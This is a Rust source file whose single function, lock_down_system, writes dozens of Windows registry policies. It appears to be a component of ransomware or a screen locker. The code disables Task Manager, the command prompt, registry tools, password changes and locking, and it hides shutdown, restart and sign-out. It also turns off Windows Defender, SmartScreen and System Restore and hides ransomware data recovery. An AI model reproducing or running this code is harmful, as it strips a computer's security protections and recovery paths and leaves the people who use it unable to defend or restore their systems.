use std::path::Path;
use std::str;
use winreg;
use winreg::enums::*;
use winreg::RegKey;

pub fn lock_down_system() {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();

    key.set_value("DisableChangePassword", &1u32);

    key.set_value("DisableLockWorkstation", &1u32);

    key.set_value("DisableTaskMgr", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("HidePowerOptions", &1u32);

    key.set_value("NoControlPanel", &1u32);

    key.set_value("NoRun", &1u32);

    let path = Path::new("SOFTWARE\\Policies\\Microsoft\\Windows\\System");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("DisableCMD", &1u32);

    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("HideFastUserSwitching", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("HidePowerOptions", &1u32);

    key.set_value("NoControlPanel", &1u32);

    key.set_value("NoRun", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Search\\AllowFindMyFiles");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowEditDeviceName");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowLanguage");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowPowerSleep");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowSignInOptions");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Settings\\AllowYourAccount");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableAppInstallControl",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\EnableSmartScreenInShell",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\SmartScreen\\PreventOverrideForFilesInShell",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\DisableContextMenus");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideAppList");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideChangeAccountSettings");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideFrequentlyUsedApps");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideHibernate");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideLock");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePeopleBar");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HidePowerButton");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentJumplists");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRecentlyAddedApps");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideRestart");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideShutDown");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSignOut");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSleep");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideSwitchAccount");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\HideUserTile");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\Start\\NoPinningToTaskbar");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDeviceDelete");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDiagnosticDataViewer",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableDirectXDatabaseUpdate",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableEnterpriseAuthProxy",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path =
        Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\System\\DisableSystemRestore");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Microsoft\\PolicyManager\\default\\TaskManager\\AllowEndTask");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableAccountProtectionUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableDeviceSecurityUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableNetworkUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisableVirusUI",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\DisallowExploitProtectionOverride",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &0u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideRansomwareDataRecovery",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
            "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsDefenderSecurityCenter\\HideSecureBoot",
        );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\DontDisplayNetworkSelectionUI",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new(
        "SOFTWARE\\Microsoft\\PolicyManager\\default\\WindowsLogon\\HideFastUserSwitching",
    );
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("value", &1u32);

    let path = Path::new("SOFTWARE\\Policies\\Microsoft\\Windows Defender");
    let (key, disp) = hklm.create_subkey(&path).unwrap();
    key.set_value("DisableAntiSpyware", &1u32);

    let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    let (key, disp) = hkcu.create_subkey(&path).unwrap();
    key.set_value("DisableRegistryTools", &1u32);
}
